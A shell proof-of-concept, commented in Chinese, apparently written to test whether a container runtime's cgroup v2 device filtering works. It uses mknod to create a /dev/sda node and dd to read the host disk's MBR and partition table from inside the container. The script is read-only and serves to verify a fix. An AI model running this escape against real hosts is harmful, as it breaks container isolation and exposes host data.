#!/bin/sh
# INJ-A8-devices/pwn.sh — 在容器内运行（作为 init），验证 A8「cgroup 设备过滤失效」
#
# 证据：mknod /dev/sda 设备节点 + 只读 dump 宿主磁盘 MBR
#       - 漏洞态（无 eBPF 过滤）→ 读到宿主磁盘真实分区表 + 0x55AA 签名
#       - 修复态（cgroup v2 附加 eBPF 过滤）→ dd 报 Permission denied
#
# 只读磁盘，不做任何写入，无破坏性副作用。

echo "===== A8-PoC: cgroup v2 设备过滤失效 ====="

echo "--- mknod /dev/sda (b 8:0) ---"
mknod /tmp/sda b 8 0 2>&1 || { echo "mknod 失败（无 CAP_MKNOD?）"; echo "A8-BLOCKED" > /pwned-a8.txt; exit 1; }
ls -l /tmp/sda

echo ""
echo "--- dd 读宿主磁盘 MBR（前 512 字节，修复态应被 eBPF 拒绝）---"
if dd if=/tmp/sda bs=512 count=1 2>/dev/null | od -A x -t x1z; then
    echo "READ-OK: 已读到宿主磁盘原始数据（修复态这里应 EPERM）"
    echo "A8-PWNED: host disk readable" > /pwned-a8.txt
else
    echo "READ-BLOCKED"
    echo "A8-BLOCKED" > /pwned-a8.txt
fi

echo ""
echo "--- 分区表（MBR offset 446，4×16B）与 55AA 签名 ---"
dd if=/tmp/sda bs=1 skip=446 count=64 2>/dev/null | od -A d -t x1
echo "MBR 末尾签名（应为 55 aa）："
dd if=/tmp/sda bs=1 skip=510 count=2 2>/dev/null | od -A d -t x1

echo ""
echo "===== A8-PoC done ====="
